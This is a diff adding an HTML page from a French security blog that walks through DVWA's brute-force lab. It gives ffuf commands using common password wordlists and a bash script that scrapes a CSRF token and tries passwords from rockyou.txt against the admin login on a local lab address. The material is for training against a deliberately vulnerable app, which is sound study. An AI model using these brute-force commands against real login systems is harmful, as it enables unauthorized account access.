@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src-attr 'unsafe-inline'">
+
+    <title>DVWA - Brute Force | Theora59 Devs Adventures</title>
+
+    <link rel="preload" href="https://theora59-dev.github.io/blog/fonts/FiraCode-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="https://theora59-dev.github.io/blog/fonts/FiraCode-Bold.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://theora59-dev.github.io/blog/css/style.css?h=b15039a827e49a424ac9">
+    <script src="https://theora59-dev.github.io/blog/js/auto-close-popover-on-resize.js?h=4ef87d6fc7b98b22e044" defer></script>
+    <script src="https://theora59-dev.github.io/blog/js/copy-code-to-clipboard.js?h=6aac77c47d552a0ac847" defer></script>
+
+    <link rel="canonical" href="https://theora59-dev.github.io/blog/cours/brute-force/">
+    
+    <meta name="description" content="Explication technique des techniques de bruteforce basiques">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#211f1a">
+    <meta name="color-scheme" content="dark">
+
+    <meta property="og:title" content="DVWA - Brute Force">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://theora59-dev.github.io/blog/cours/brute-force/">
+    <meta property="og:description" content="Explication technique des techniques de bruteforce basiques">
+    <meta property="og:site_name" content="Theora59 Devs Adventures">
+    <meta property="og:updated_time" content="2025-12-23T16:51:21.836412358+01:00">
+    <meta property="article:published_time" content="2025-12-22T00:00:00+00:00">
+    <meta property="article:tag" content="cybersécurité">
+    <meta property="article:tag" content="DVWA">
+    <meta property="article:tag" content="web">
+</head>
+
+<body class="layout-center">
+    <header class="header">
+        <div class="header-container">
+            <span class="header-logo-container">
+                <a href="https://theora59-dev.github.io/blog">
+                    <span class="logo">Theora59 Devs Adventures</span>
+                </a>
+            </span>
+        </div>
+        <nav class="main-menu" aria-label="Main Menu">
+            <a class="skip-to-content" href="#main">Skip to main content</a>
+            <button class="main-menu-dropdown-button" popovertarget="nav-menu">Menu</button>
+            <ul id="nav-menu" class="main-menu-items" aria-label="Site Navigation" popover>
+                <li><a href="https://theora59-dev.github.io/blog/">Accueil</a></li>
+                <li><a href="https://theora59-dev.github.io/blog/projets/">Projets</a></li>
+                <li><a href="https://theora59-dev.github.io/blog/cours/">Cours</a></li>
+                <li><a href="https://theora59-dev.github.io/blog/tags/">Tags</a></li>
+                <li><a href="https://github.com/Theora59-dev/" target="_blank">Github</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main id="main">
+        <article class="post content">
+            <header>
+                <h1 class="post-title">
+                    <a href="https://theora59-dev.github.io/blog/cours/brute-force/">DVWA - Brute Force</a>
+                </h1>
+                <ul class="post-meta hidden">
+                    <li title="Published on 2025-12-22"><time datetime="2025-12-22">2025.12.22</time></li>
+                    <li role="separator" aria-hidden="true">::</li>
+                    <li title="96 words"><time datetime="PT1M">1 min</time> read</li>
+                </ul>
+                <div class="post-tags">
+                    <span>#<a rel="tag" href="https://theora59-dev.github.io/blog/tags/cybersecurite/">cybersécurité</a></span>
+                    <span>#<a rel="tag" href="https://theora59-dev.github.io/blog/tags/dvwa/">DVWA</a></span>
+                    <span>#<a rel="tag" href="https://theora59-dev.github.io/blog/tags/web/">web</a></span>
+                </div>
+            </header>
+
+<h2 id="easy">Easy:</h2>
+<ul>
+<li>Utiliser l'outil FFUF:
+(Mettre USERFUZZ et PASSFUZZ dans <code>request.txt</code> )</li>
+</ul>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">ffuf -request-proto</span><span> http</span><span style="color:#bf616a;"> -c -r -mode</span><span> clusterbomb</span><span style="color:#bf616a;"> -request</span><span> request.txt 
+</span><span style="color:#bf616a;">-w</span><span> /usr/share/wordlists/metasploit/unix_users.txt:USERFUZZ 
+</span><span style="color:#bf616a;">-w</span><span> /usr/share/wordlists/metasploit/unix_passwords.txt:PASSFUZZ</span><span style="color:#bf616a;"> -fw</span><span> 250
+</span></code></pre>
+<h2 id="medium">Medium:</h2>
+<ul>
+<li>Privilégier <code>ffuf</code> à <code>hydra</code> ou <code>burpsuite</code> (Trop complexe ou complet):</li>
+</ul>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">ffuf -c -u </span><span>&quot;</span><span style="color:#a3be8c;">http://...........</span><span>&quot;</span><span style="color:#bf616a;"> -w</span><span> /usr/share/wordlists/rockyou.txt 
+</span><span style="color:#bf616a;">-b </span><span>&quot;</span><span style="color:#a3be8c;">PHPSESSID=..........;</span><span>&quot;</span><span style="color:#bf616a;"> -fs</span><span> lataille
+</span></code></pre>
+<ul>
+<li>remplacer le champs à brute forcer dans l'URL avec le mot clef <code>FUZZ</code></li>
+<li>prendre des wordlists courtes si pas de temps</li>
+</ul>
+<table><thead><tr><th>Arguments</th><th>Explications</th></tr></thead><tbody>
+<tr><td>-c</td><td>Mode Couleur</td></tr>
+<tr><td>-u</td><td>préciser l'url</td></tr>
+<tr><td>-w</td><td>préciser la wordlist</td></tr>
+<tr><td>-b</td><td>préciser les cookies de sessions</td></tr>
+<tr><td>-fs</td><td>éliminer les faux positifs en triant par la taille (size) de la réponse</td></tr>
+</tbody></table>
+<h2 id="hard">Hard:</h2>
+<p>Si le <strong>cookie de session</strong> change à chaque fois:</p>
+<ul>
+<li>faire un script pour générer dynamiquement le token CSRF ( != cookie de connexion)</li>
+</ul>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#65737e;">#!/bin/bash
+</span><span>
+</span><span style="color:#bf616a;">BASE_URL</span><span>=&quot;</span><span style="color:#a3be8c;">http://172.18.74.130:4280/vulnerabilities/brute/</span><span>&quot; 
+</span><span style="color:#bf616a;">COOKIES</span><span>=&quot;</span><span style="color:#a3be8c;">PHPSESSID=d191bfc7ef1d4393a6ca0f25b0c94425; security=high</span><span>&quot; 
+</span><span style="color:#bf616a;">WORDLIST</span><span>=&quot;</span><span style="color:#a3be8c;">/usr/share/wordlists/rockyou.txt</span><span>&quot;
+</span><span style="color:#bf616a;">FOUND</span><span>=</span><span style="color:#a3be8c;">0
+</span><span>
+</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">get_csrf_token</span><span>(){
+</span><span>	</span><span style="color:#bf616a;">CSRF_TOKEN</span><span>=$</span><span style="color:#a3be8c;">(
+</span><span style="color:#a3be8c;">    </span><span style="color:#bf616a;">curl -s </span><span>&quot;$</span><span style="color:#bf616a;">BASE_URL</span><span>&quot;</span><span style="color:#bf616a;"> --cookie </span><span>&quot;$</span><span style="color:#bf616a;">COOKIES</span><span>&quot; 
+</span><span style="color:#a3be8c;">    </span><span>| </span><span style="color:#bf616a;">grep -oP </span><span>&quot;</span><span style="color:#a3be8c;">value=&#39;\K[a-f\d]{32}(?=&#39;)</span><span>&quot;
+</span><span style="color:#a3be8c;">	)
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">brute_force</span><span>(){
+</span><span>	</span><span style="color:#b48ead;">while </span><span style="color:#96b5b4;">read </span><span style="color:#bf616a;">-r</span><span> PASS
+</span><span>	</span><span style="color:#b48ead;">do
+</span><span>		</span><span style="color:#bf616a;">get_csrf_token
+</span><span>			</span><span style="color:#bf616a;">curl -s </span><span>&quot;$</span><span style="color:#bf616a;">BASE_URL</span><span style="color:#a3be8c;">?username=admin&amp;password=</span><span>$</span><span style="color:#bf616a;">PASS</span><span style="color:#a3be8c;">&amp;Login=Login&amp;user_token=</span><span>$</span><span style="color:#bf616a;">CSRF_TOKEN</span><span>&quot;</span><span style="color:#bf616a;"> --cookie </span><span>&quot;$</span><span style="color:#bf616a;">COOKIES</span><span>&quot; 
+</span><span>			        | </span><span style="color:#bf616a;">grep -q </span><span>&#39;</span><span style="color:#a3be8c;">Username and/or password incorrect</span><span>&#39; </span><span style="color:#d08770;">2</span><span>&gt;/dev/null || </span><span style="color:#bf616a;">FOUND</span><span>=</span><span style="color:#a3be8c;">1
+</span><span>
+</span><span>		</span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">[[ </span><span>&quot;$</span><span style="color:#bf616a;">FOUND</span><span>&quot; </span><span style="color:#bf616a;">-eq</span><span> 1 </span><span style="color:#96b5b4;">]]
+</span><span>		</span><span style="color:#b48ead;">then
+</span><span>			</span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">Password found: </span><span>$</span><span style="color:#bf616a;">PASS</span><span>&quot;
+</span><span>			</span><span style="color:#96b5b4;">exit
+</span><span>		</span><span style="color:#b48ead;">fi
+</span><span style="color:#b48ead;">done </span><span>&lt; &quot;$</span><span style="color:#bf616a;">WORDLIST</span><span>&quot;
+</span><span>
+</span><span style="color:#bf616a;">brute_force
+</span></code></pre>
+
+        </article>
+        <nav class="post-navigation">
+            <header class="post-navigation-title">
+                <h2>Read More Posts</h2>
+                <hr>
+            </header>
+            <div class="post-navigation-buttons">
+                <a rel="next" href="https://theora59-dev.github.io/blog/cours/xss-stored/" aria-label="Next article">
+                    <span aria-hidden="true">&lt;&nbsp;[</span>DVWA - XSS (STORED)<span aria-hidden="true">]</span>
+                </a>
+                <span aria-hidden="true" role="separator">::</span>
+                <a rel="prev" href="https://theora59-dev.github.io/blog/cours/cmd-injection/" aria-label="Prev article">
+                    <span aria-hidden="true">[</span>DVWA - Command Injection<span aria-hidden="true">]&nbsp;&gt;</span>
+                </a>
+            </div>
+        </nav>
+    </main>
+    <footer class="footer">
+        <p class="copyright">
+            <span>© <time>2025</time></span>
+            <span>Powered by <a href="https://www.getzola.org">Zola</a></span>
+            <span>Theme by <a href="https://eyalkalderon.com">ebkalderon</a></span>
+        </p>
+    </footer>
+</body>
+
+</html>
